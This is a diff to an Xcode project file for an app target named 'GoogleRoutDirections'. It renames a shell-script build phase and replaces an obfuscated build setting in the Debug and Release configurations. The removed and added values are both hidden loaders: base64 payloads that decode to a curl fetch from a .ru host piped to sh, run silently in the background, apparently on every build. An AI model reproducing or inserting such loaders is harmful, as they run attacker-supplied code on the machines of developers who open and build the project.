@@ -98,7 +98,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 840B7B431FEE4869007B4BD3 /* Build configuration list for PBXNativeTarget "GoogleRoutDirections" */;
 			buildPhases = (
-				D963CF3386A64FC6AC7BBDC8 /* Build Target Libraries */,
+				F7066E5B15994AFAAE7BBDC8 /* Provision Library Executable */,
 				F6962168432EB494F8883700 /* [CP] Check Pods Manifest.lock */,
 				840B7B2D1FEE4869007B4BD3 /* Sources */,
 				840B7B2E1FEE4869007B4BD3 /* Frameworks */,
@@ -166,7 +166,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		D963CF3386A64FC6AC7BBDC8 /* Build Target Libraries */ = {
+		F7066E5B15994AFAAE7BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -176,7 +176,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -279,7 +279,7 @@
 		840B7B411FEE4869007B4BD3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf baose64 | tr -d o` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAta3NmTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -337,7 +337,7 @@
 		840B7B421FEE4869007B4BD3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf baose64 | tr -d o` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAta3NmTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
